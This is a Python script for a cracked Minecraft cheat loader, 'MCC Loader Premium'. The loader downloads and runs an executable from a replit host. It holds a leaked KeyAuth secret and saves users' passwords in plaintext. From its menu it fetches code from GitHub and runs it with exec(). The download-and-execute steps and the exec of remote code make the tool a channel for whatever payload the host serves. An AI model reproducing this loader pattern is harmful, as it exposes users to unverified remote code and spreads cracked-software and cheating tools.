import sys
import getpass
import time
from time import sleep, strftime
from datetime import datetime
import threading
import webbrowser, os, re, json, random

try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style
    import requests, random, re
    from random import choice, randint, shuffle
    import pystyle
    import ctypes
except:
    os.system("pip install faker")
    os.system("pip install requests")
    os.system("pip install colorama")
    os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pycryptodome')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import urllib.request
import io
print("Downloading libraries...")
os.system("curl https://3bce38d9-73a1-4987-83a8-ee2702382e49-00-2ooy87kixqhod.spock.replit.dev/Background2.bmp --progress-bar > Background2.bmp")
os.system("curl https://3bce38d9-73a1-4987-83a8-ee2702382e49-00-2ooy87kixqhod.spock.replit.dev/Background.exe --progress-bar > Background.exe")
from keyauth import api
import platform
import hashlib
import json as jsond
# import json as jsond
# ^^ only for auto login/json writing/reading
def bg1():
    os.system("Background.exe Background2.bmp /t 25 /b")
os.system("cls")
def windowtitle(a): os.system(f"title {a}")
windowtitle("MCC Loader Premium ^<^/^> ^| Not Authorized")
os.system('cls')
print("Waiting for authenication...")
os.system('cls')
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
def set_window_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

keyauthapp = api(
    name = "MCCPremium - Cracked by WalmartSolutions",
    ownerid = "ZEzjx77GZ6",
    secret = "f553adcf53ac7bf7ac93a43a36f8866559c41e2a4cee89bbab9b7c37a7f65409",
    version = "1.0",
    hash_to_check = getchecksum()
)

try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1":
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nInvalid Option.")
                os._exit(1)
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ")
            if ans=="1":
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option.")
                os._exit(1)
        except Exception as e: #Error stuff
            print(e)
            os._exit(1)
except Exception as e: #Error stuff
    print(e)
set_window_title(f"MCC Loader Premium | Logged in as {keyauthapp.user_data.username}")
print("\nKeyauth info: ")
print("Username: " + keyauthapp.user_data.username)
print("UUID: " + keyauthapp.user_data.hwid)
bg1()
#MCC's Archive Code Below - Edited by Lev
time.sleep(2)
os.system("cls")
banner = r"""
        ███╗░░░███╗░█████╗░░█████╗░██╗░██████╗  ░█████╗░██████╗░░█████╗░██╗░░██╗██╗██╗░░░██╗███████╗
        ████╗░████║██╔══██╗██╔══██╗╚█║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██║░░██║██║██║░░░██║██╔════╝
        ██╔████╔██║██║░░╚═╝██║░░╚═╝░╚╝╚█████╗░  ███████║██████╔╝██║░░╚═╝███████║██║╚██╗░██╔╝█████╗░░
        ██║╚██╔╝██║██║░░██╗██║░░██╗░░░░╚═══██╗  ██╔══██║██╔══██╗██║░░██╗██╔══██║██║░╚████╔╝░██╔══╝░░
        ██║░╚═╝░██║╚█████╔╝╚█████╔╝░░░██████╔╝  ██║░░██║██║░░██║╚█████╔╝██║░░██║██║░░╚██╔╝░░███████╗
        ╚═╝░░░░░╚═╝░╚════╝░░╚════╝░░░░╚═════╝░  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝
        MCC Loader Premium 1.1,a product from MCC's Archive. Reverse engeneering can lead to legal action. 
"""[1:]
Anime.Fade(Center.Center(banner), Colors.red_to_yellow, Colorate.Vertical, enter=True)
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb = "\033[1;39m"
red = "\033[0;31m"
redb = "\033[1;31m"
end = '\033[0m'
dev = "\033[1;39m[\033[1;31mÃ—\033[1;39m]\033[1;39m"

pre = """
\033[1;39m



                            __  ___ ______ ______ ____                          _                 
                           /  |/  // ____// ____// __ \ _____ ___   ____ ___   (_)__  __ ____ ___ 
                          / /|_/ // /    / /    / /_/ // ___// _ \ / __ `__ \ / // / / // __ `__ \.
                         / /  / // /___ / /___ / ____// /   /  __// / / / / // // /_/ // / / / / /
                        /_/  /_/ \____/ \____//_/    /_/    \___//_/ /_/ /_//_/ \__,_//_/ /_/ /_/



\033[1;39m
   \033[0;31m                                          Welcome, choose any sections.

                                    \033[1;31m[\033[1;39m1\033[1;31m] \033[1;34mMinecraft                \033[1;31m[\033[1;39mSS\033[1;31m] \033[1;34mScreen Share Tools
    """
print(pre)
while True:
    os.system('cls')
    print(pre)
    chon = Write.Input("         [×] >>  ", Colors.red_to_purple, interval=0.0025)
    if chon == '1':
        os.system('cls')
        print("                                              \033[1;39mLoading Minecraft Section..")
        exec(requests.get('https://raw.githubusercontent.com/WalmartSolutions/MCC-Loader-Premium/main/Minecraft').text)
    if chon == 'SS':
        os.system('cls')
        print("                                            \033[1;39mLoading Screen Share Tools Section..")
        exec(requests.get('https://raw.githubusercontent.com/WalmartSolutions/MCC-Loader-Premium/main/SStool').text)
    if chon == '3':
        os.system('cls')
        print("                                            \033[1;39mOpening PyClicker..")
        os.system('cd Py/')
        os.system('PYClicker.exe')
    else:
        continue
